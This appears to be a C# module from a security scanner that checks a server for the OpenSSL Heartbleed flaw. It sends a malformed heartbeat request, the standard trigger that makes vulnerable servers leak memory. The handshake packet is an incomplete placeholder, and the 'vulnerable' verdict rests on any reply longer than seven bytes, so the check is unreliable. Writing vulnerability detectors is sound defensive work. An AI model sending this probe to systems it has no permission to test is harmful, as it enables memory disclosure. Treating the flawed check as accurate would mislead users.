using System;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Threading;
using AetherSec.Core;

namespace AetherSec.Modules
{
	public class HeartbleedDetector : IScanModule
	{
		public string Name => "Heartbleed (CVE-2014-0160) Detector";
		public string Description => "Detects OpenSSL Heartbleed vulnerability by sending a malformed heartbeat.";
		public ScanSeverity Severity => ScanSeverity.Critical;

		public async Task<ScanResult> RunAsync(string targetIp)
		{
			const int port = 443;

			try
			{
				using var client = new TcpClient();
				client.ReceiveTimeout = 3000;
				client.SendTimeout = 3000;

				await client.ConnectAsync(targetIp, port);

				using var stream = client.GetStream();

				// TODO: Replace with a full valid TLS ClientHello packet
				byte[] clientHello = new byte[]
				{
					0x16, 0x03, 0x02, 0x00, 0xdc,
					0x01, 0x00, 0x00, 0xd8,
					0x03, 0x02,
                    // filler bytes
                    0x53, 0x43, 0x5b, 0x90, 0x00, 0x00, 0x00, 0x00,
					0x00, 0x00, 0x00, 0x00
				};

				await stream.WriteAsync(clientHello, 0, clientHello.Length);
				await stream.FlushAsync();

				byte[] buffer = new byte[8192];
				int totalRead = 0;
				int waitTimeMs = 0;
				while (totalRead < buffer.Length && waitTimeMs < 5000)
				{
					if (stream.DataAvailable)
					{
						int bytesRead = await stream.ReadAsync(buffer, totalRead, buffer.Length - totalRead);
						if (bytesRead <= 0) break;
						totalRead += bytesRead;
					}
					else
					{
						await Task.Delay(100);
						waitTimeMs += 100;
					}
				}

				if (totalRead == 0)
				{
					return new ScanResult(false, "No response from server after ClientHello.", targetIp);
				}

				byte[] heartbeatRequest = new byte[]
				{
					0x18, 0x03, 0x02, 0x00, 0x03,
					0x01, 0x40, 0x00
				};

				await stream.WriteAsync(heartbeatRequest, 0, heartbeatRequest.Length);
				await stream.FlushAsync();

				totalRead = 0;
				waitTimeMs = 0;
				while (totalRead < buffer.Length && waitTimeMs < 5000)
				{
					if (stream.DataAvailable)
					{
						int bytesRead = await stream.ReadAsync(buffer, totalRead, buffer.Length - totalRead);
						if (bytesRead <= 0) break;
						totalRead += bytesRead;
					}
					else
					{
						await Task.Delay(100);
						waitTimeMs += 100;
					}
				}

				if (totalRead > 7)
				{
					return new ScanResult(true, "Target is vulnerable to Heartbleed (OpenSSL leak detected).", targetIp, Severity: ScanSeverity.Critical);
				}

				return new ScanResult(false, "Target is not vulnerable to Heartbleed.", targetIp);
			}
			catch (Exception ex)
			{
				return new ScanResult(false, $"Heartbleed check failed: {ex.Message}", targetIp);
			}
		}
	}
}
